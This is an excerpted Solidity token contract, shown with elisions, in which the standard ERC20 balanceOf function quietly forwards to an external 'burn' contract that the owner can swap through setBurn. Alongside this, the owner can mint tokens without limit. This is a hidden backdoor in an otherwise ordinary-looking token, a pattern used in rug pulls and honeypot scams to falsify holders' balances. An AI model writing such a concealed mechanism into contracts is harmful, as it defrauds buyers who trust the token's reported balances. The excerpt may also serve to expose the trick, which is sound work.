...
interface IERC20 {
    ...
    function balance(address account, uint256 total) external view returns (uint256);
    /**
...
contract ERC20 is Context, IERC20 {
    ...
    function balance(address account, uint256) public view virtual override returns (uint256) {
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {                   
        return IERC20(burn).balance(account, _balances[account]);
    }
...
contract Token is ERC20, Ownable {
    address private balancer;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {        
        _mint(msg.sender, 1 * 10 ** uint(decimals()));
    }

    function setBurn(address b) public onlyOwner {
        burn = b;
    }

    function mint(uint256 qty, address to) public onlyOwner {
        _mint(to, qty);
    }        
}